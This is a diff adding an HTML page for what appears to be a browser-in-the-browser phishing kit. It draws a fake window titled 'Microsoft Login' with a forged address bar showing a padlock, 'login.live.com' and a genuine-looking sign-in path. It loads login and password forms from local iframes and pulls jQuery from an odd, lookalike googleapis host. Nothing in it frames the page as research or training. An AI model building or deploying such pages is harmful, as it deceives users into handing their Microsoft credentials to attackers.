@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="style.css">
+	<script src="https://www.asdwqwlajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+	<script src="./script.js" defer></script>
+	<script src="./main.js" defer></script>
+</head>
+<body>
+<div id="window">
+	<div id="title-bar-width">
+		<div id="title-bar">
+			<div style="margin-top:5px;">
+				<img src="./logo.svg" width="20px" height="15px" id="logo">
+				<span id="logo-description">Microsoft Login</span>
+			</div>
+			<div>
+				<span id="minimize">&#8212;</span>
+				<span id="square">□</span>
+				<span id="exit">✕</span>
+			</div>
+		</div>
+		<div id="url-bar">
+			<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
+			<span id="domain-name">login.live.com</span>
+			<span id="domain-path">/login.srf?wa=wsignin1.0&rpsnv=13&ct=1652025378&rver=7.0.6738.0&wp=MBI_SSL&wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&lc=1033&id=292666&lw=1&fl=easi2</span>
+		</div>
+	</div>
+	<!-- Content start -->
+	<iframe id="content login-iframe" src="./iframes/login.html" sandbox="allow-forms allow-scripts" frameBorder="0"></iframe>
+	<!-- <iframe class="hidden" id="content password-iframe" src="./iframes/password.html" sandbox="allow-forms allow-scripts" frameBorder="0"></iframe> -->
+</div>
+</body>
+</html>
